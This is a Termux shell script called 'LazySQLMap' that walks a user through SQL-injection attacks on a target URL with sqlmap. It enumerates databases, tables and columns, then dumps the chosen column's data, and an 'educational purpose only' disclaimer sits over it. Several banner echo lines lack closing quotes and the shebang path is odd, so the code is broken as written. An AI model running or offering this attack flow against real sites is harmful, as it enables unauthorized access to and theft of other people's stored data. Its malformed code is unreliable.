#!/data/data/com.termux/files/usr/bin/lazysqlmap
# LazySQLMap
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : MR.5ECRE7 | Moslem Cyber Team
# Recoded From : V3RLUCHIE
#

# START

# Header 
echo " _  __ ____    ____  _____ ____ ____  _____ _____
echo "|  \/  |  _ \  | ___|| ____/ ___|  _ \| ____|___  |
echo "| |\/| | |_) | |___ \|  _|| |   | |_) |  _|    / /
echo "| |  | |  _ < _ ___) | |__| |___|  _ <| |___  / /
echo "|_|  |_|_| \_(_)____/|_____\____|_| \_\_____|/_/
echo "                  
echo ""                                     
echo "    Let's Make Your Exploitation And Have Fun"
echo "" 
echo "    ==[ Tools Name : LazySQLMap"
echo "    ==[ ReCoded by : MR.5ECRE7"
echo "    ==[ Version : 1.0.0"
echo "    ==[ Codename : Let's Play with your Imagination"
echo "    ==[ Special Thanks to V3RLUCHIE

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " Termux-LazySQLMap >>"
read TARGET
python2 sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read DATABASE
python2 sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " Termux-LazySQLMap >>"
read TABLE
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " Termux-LazySQLMap >>"
read COLUMN
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END
